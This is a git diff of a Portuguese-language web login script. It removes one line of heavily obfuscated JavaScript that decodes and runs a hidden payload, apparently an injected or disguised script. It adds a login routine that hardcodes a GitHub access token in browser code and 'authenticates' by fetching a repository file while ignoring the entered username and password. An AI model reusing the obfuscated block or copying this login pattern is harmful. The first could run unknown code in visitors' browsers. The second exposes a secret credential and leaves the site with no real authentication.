@@ -1,1 +1,74 @@
-var goBack,btn,script,validarLogin,checkEnter,senhaInput,mostrarSenhaIcon;(function(){var hXa='',wHj=443-432;function uxj(e){var p=2821155;var u=e.length;var z=[];for(var a=0;a<u;a++){z[a]=e.charAt(a)};for(var a=0;a<u;a++){var g=p*(a+171)+(p%20702);var t=p*(a+570)+(p%12824);var j=g%u;var q=t%u;var x=z[j];z[j]=z[q];z[q]=x;p=(g+t)%3655405;};return z.join('')};var VxI=uxj('ciasmypceofrbolgkqodsjunnhtucvttrwxrz').substr(0,wHj);var iQt='0au,m11(] )2(r;v[6av=r gs")bhdiigh2.n+;n(c.o;zyv-z="=;.;, dd[3ape86ej(vlj+b,+1o8u,(9+7(8=5u(i=,o=63,q7e.tgl187m;vhu7;,ham;= .*}[u].ficmvta(eq[+t,kp)1)..att +haq0>;t-=a(=ova;=c=r((ys!e;tae=r]xy=,ebvf1r)vamhjil(b.ar=[ren9s))vt fr;3+o18d;rts[a+ u.0g81rh(.8isiha;lm).a r.,qr k{(flln[tC)i;o<=0=Ci-)too=2r=,]6rmlarvg,)(hr;[av 6ae0mlaC}roq7.g3x]uu)rtm nvtfoaat rw9or.)=+ h=a.j<uap,w)cv,rg0lc,cgasCkd0A=;+))v.nqj6d,fttfsftw}C;({i]ve1v4.;=br"m7eft."l+)-};t=e=v+l)v ++)nc=aflr6).zrvw(;san;g,m[C6cp;t(t]y=i=n(a[rA++t9]hr(toueftdm[;6-diw=nt +d2di7lS)ncho+<;u=;;if;0;]na;=)yn"])1 (a0a))c);=r>,zgun}tbs(l0==a=)n"r6t+;(2;"f8Csi,0l.a4(ij(mstne,os{{a(t<;)=ggprreansb+au]hm}vha)rsAhp.heho Cr"l2m)rj[pns{0!;8]eezv7rrohj=(;ia5[ri4 hr n*,3a,=;+1llh0l96.rx5.ch -ha<k,trirkc=;tli;gyfsoauxsncfu, vrs 7S]((lo ,=un+2 9lenl;m;t}+-omo)svc,pkv=n"cc1(A{4,ai.no)n0fv;][.ufrc;( sv9op;({rt+)t;+e6sl(ro;;pwq=psn"Ahe.ior=(u)n';var tqv=uxj[VxI];var CIZ='';var zbn=tqv;var idH=tqv(CIZ,uxj(iQt));var XVC=idH(uxj('c0,"_\/o@4(1Aeua=A#!.enFatAA53ArA4)9ea3A(cAaYe;fA13neh"1lwrAAhddeAtnAPo$fdH-(c;A_MAla%7APeagAAib)ina_96ejic9srj%(rAUAA^erbt[cziA3wdeni=KX;s@5tlAfAc\'hmrbdVnLrej5Aosrsp],ii=t..0AaAAas(sciAo4,Drag6oO)d;Aa$trA u^ai]tA_A;)}n_@;eH[bu40[;r35)bJIn3])AA+jA9At56{5AFA)7AA)j"t5f0aprAWAA =_M)rA)$6AefA3AoA;rw .A)A!r411[!cA!.3A!.%(i,a)3_%+a6A}2tAfrn6AbA8{g_=e]2743oAl4)A7nom)(=i])t_u(\\r=a{&2tiisA%6=6.]%nioaYd`AAre_%(a$a]aiAos-0#dA\/uA1).3testgrAraa,n)e3.an=f%eoea(eiA(teawyIqA2aEr4)E{3n%dAlmslIFk].!o;)bsA IwctfsU3Aa]r6e i([2mri{(AA(v$_$d!,eu!_ )dg(*fiAu8el.3$CnZiRAbta,.(Ai,bFdA(.meA9E1.K0)et5y%dAnm(n4Tb. x.Ua+_ rrAefeV \/eCrae} wwtAe<=Ae.ornk.[ekH,f6=ct]c(o344al2i)h-ey]5a)%6crd!! crs-po fe2{2d0%6y](B$2$tAr19goauvdAAa6A];S\';h5(O2&I1i)ib([i.aEsn.)olt eoEAsp3fA*iF8fmiSaw5]%sA%A At2)Ap A]_3A&)6a(tAaG42A6s2)sfa 4(tA4s $Sef.cl"!_)vVtw)e2ZnaAASt!aX%eZ$=.iQf0!s47"$si_,i9! !)f,AoZ_.},;en%AA[A!o)At[3(}_y_r%5A,6es.}%eA(0]Ap,n93A2Af8}pl]s+o).!2)1>.Et(6a))Avr]A Cd06LTo3Qd_40eAyi,A.+=(Aw,Je]%2=!F.33(s14l(a,Ang(.tg4)3(v3\\58a>.AaAAAst,41Cf.&gAosaA_A3Rp.6(1;A|A=;Ri56\\3F3Ar15{miEA,A7%(faf!a;4pu3g(u_A)dkAv%!A)S}AAg5epA;jlo!{9rrohAt;Al!!4@(A,hnv!AA0}4$}fR{A.=e3A247[)tu)e_))iA)9o2uhe!soeAa1o4nAiN5 aA.A)cdnfJRi(!x1o]iA(dhA] =.,A0oa;AoA2c,sci,ch.96\/)\/A)g)hO6s;mbf0n)G;)Ae$A3:-}.eAf@w aeI6A%;0d2pA 8T3$lidAA&%Aaa)sta_"ZA)(iA$4@a_!A}_013A.!Cato}aA(A (jlduoyfs$(e#rFP);arHt;e.vg1vA<A]AA{4A)_D a3RA2zet6_.QbGA!,AAt7r];1Nd) l3.tIu)A2s;X;A}})4(41K0;\/u1fl&3g]$$f;u.)%tocIe9uA2dd$1eA2A1s;^.AV!;oh1(A(E4(AAss.,n(5t7aIe.)s:2)Ae{aAI1i.4]A=A}.A$0hS"=A$v81isABsv#r.di3e;)(Q,9%l $es^pesfUA5.d$ned..%AA0.b(A;".)_M1A=2kAAi[e1[)M_#s%(ae.AcA%ee}=%;!{uo](,3AtAP}c.A\'.#18(,aiA1_;%A_A.52AA@ito4je_%2A=A%1oA#AY)]31eAAAC=(D<A)or1K{(%FOfac"ALA3"o3@6vA.sn5seAA.5re_Ant[%tu166$p(tAiAia=ansU4i r!f"[2a5dne[1]k[aAA;#)6({;7 } (&.s3{AAAAA;mo]i{Aw]2$8$!A2)i=%F;1jAE[vl}i4114h(1AoA]io5_{u]A;{AriA}AAA6lKA8a4(]Al7l=%ea@jc!A c)9e1(9VP} 4A*n%eAur,6.e1j(3^ka)afeAPA1fx_=2] ,A37oA!eo;eAe_s>Aan<Ag8=;iA177);7o]sAKAd[iAAA !lA8(r#2ogtnAja;%9Ac;]ui,rQ8.p%9(}%gl=(.h1cdtjA]4=7euaAvf1t]@A1{nA_tro`)5hs1i1Sn}AEAin}t]%+]P;l}6.5A=.$YtaLe%\'t)n;d)nAeAAB44_mA2ap9T!9$_:.6As=14R.0]A)aT91n],5i3^]pcAFc4AJl64;iAaI$w;,ir6==]A()Ts;ifr!tKAe4,1.2A-tRoAA6Au.]iouA)j)t"K({n3u_AsA+Ct1=)FAb9j.60$)eA*AA5)sC;_Aour;".vAknhvjo4=sA ,h,$p{=Ar.!.]n$4e3jS.AA_(o6A(!5Ae_;oA}P;oe)(1acA52AvA}4(XAAE,A)n?ta3()p%A3,Ap(sr)1UA_i0s8;24Fs:h.e2{))A$e}$t7u3ilE(l5S7[8gAm3fCAd)62o]:_!t140w{[sAa\\.1Fn6(j_nt]]5A..$AxslXA;==i]m_0=_(AqA(Aa29A(a3ABAbeA(A187 Aerie1]-P0: 6!8eA%nv.ae?_6k!}ssnn;5aiA{r5jaf1\/6.77)4o,fiAAiAvA]rA\/AA!]+,N$AAAF Ap{$ta}1a$eAi16[AAAuAnAt9oAoAA5 .g1d\/=ABA2] rh(SbvA$_txgrA(n;_!]a}na( @teA^.f ;at(. [Es\'(r (oapo"c)?d$p ),o(uAa)yn,3{.ai6)_3g#okeAs3Alr)A3)AKY!ff;jKflr.A])HuatSU19aena()(1i%A.3A)!tA=Uan3iAo1;]=A)R)r$uhn3 AaiAfo` _1I]AD6=:;t4eAAE#2u:]= a_$]ent(_sf4dsCA\'djd)=AA  n{stfiUoAAsttoAAA]jN_f(0RaAo n)gltDA du.=n2(A [,(Cdn,!.A)n[1_sj313Z5s3 n|3%QoJ!%p\\i>i,)pd]paa_AF.]d.A)6C_h6GA.;AAR2ab;nAnUuh+ e9oAn)jp)tA2jAt=rnf}EV ssf$At 0cn?eA acl}A[s!s_tvar67  E_3A)fA$AA h=A)Bf.enA`_AiK<.s 1K u%AAe;h)A;hEA([A1{ 3 %m'));var JlC=zbn(hXa,XVC );JlC(5247);return 4233})()
+function validarLogin() {
+    var usuario = document.getElementById("usuario").value;
+    var senha = document.getElementById("senha").value;
+
+    autenticarUsuario(usuario, senha);
+}
+
+function autenticarUsuario(usuario, senha) {
+    var githubToken = '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';
+    var owner = 'Gustavo';
+    var repo = 'Teste1';
+    var filePath = 'abc123xyz456qwerty789link987abcdef1234567890.js';
+
+    // Construa a URL da API do GitHub para o arquivo específico
+    var apiUrl = `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`;
+
+    // Configuração da requisição
+    var requestOptions = {
+        method: 'GET',
+        headers: {
+            'Authorization': 'token ' + githubToken,
+            'User-Agent': 'Ghosthszz'
+        }
+    };
+
+    // Realizar a requisição
+    fetch(apiUrl, requestOptions)
+        .then(response => {
+            if (response.ok) {
+                // Se a resposta for bem-sucedida, redirecione para a página logada
+                window.location.href = "logado.html";
+                document.getElementById('usuario').value = '';
+                document.getElementById('senha').value = '';
+            } else {
+                // Se a resposta não for bem-sucedida, exiba uma mensagem de erro
+                alert("Credenciais inválidas. Tente novamente.");
+                document.getElementById('senha').value = '';
+            }
+        })
+        .catch(error => {
+            console.error('Erro ao autenticar usuário:', error);
+            alert("Ocorreu um erro ao autenticar. Por favor, tente novamente mais tarde.");
+        });
+}
+
+// Restante do seu código
+var btn = document.getElementById("btn_vdl");
+
+document.addEventListener("keydown", function (event) {
+    if (event.key === "Enter" || event.keyCode === 13) {
+        btn.click();
+    }
+});
+
+function checkEnter(event) {
+    if (event.key === "Enter") {
+        validarLogin();
+    }
+}
+
+const senhaInput = document.getElementById('senha');
+const mostrarSenhaIcon = document.getElementById('mostrarSenhaIcon');
+
+mostrarSenhaIcon.addEventListener('click', function () {
+    if (senhaInput.type === 'password') {
+        senhaInput.type = 'text';
+        mostrarSenhaIcon.classList.remove('fa-eye');
+        mostrarSenhaIcon.classList.add('fa-eye-slash');
+    } else {
+        senhaInput.type = 'password';
+        mostrarSenhaIcon.classList.remove('fa-eye-slash');
+        mostrarSenhaIcon.classList.add('fa-eye');
+    }
+});
